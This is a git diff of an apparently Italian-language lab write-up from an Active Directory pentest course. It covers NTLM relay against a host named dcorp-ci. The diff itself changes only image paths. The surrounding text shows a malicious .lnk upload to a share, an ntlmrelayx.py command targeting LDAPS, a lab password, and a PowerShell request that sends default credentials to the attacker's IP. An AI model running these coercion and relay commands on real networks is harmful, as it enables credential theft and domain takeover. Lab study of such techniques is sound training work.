@@ -9,7 +9,7 @@
 
 #### 1.Upload di un link malevolo, navigando la share \\\dcorp-ci\AI mostra un file di log in cui sono riportate esecuzioni automatizzate come devopsadmin &#x20;
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Attivazione ntlm relay usando wsl (WSLToTh3Rescue! come password)
 
@@ -19,7 +19,7 @@ sudo ntlmrelayx.py -t ldaps:// 172.16.2.1 -wh 172.16.100.178 -http-port '80,8080
 ```
 {% endcode %}
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Creazione link e upload su dcorp-ci
 
@@ -27,9 +27,9 @@ Creazione link e upload su dcorp-ci
 C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.178' -UseDefaultCredentials"
 ```
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### 2. Auto esecuzione del .lnk hostato su dcorp-ci ![](<../.gitbook/assets/image (5) (1) (1).png>)
 
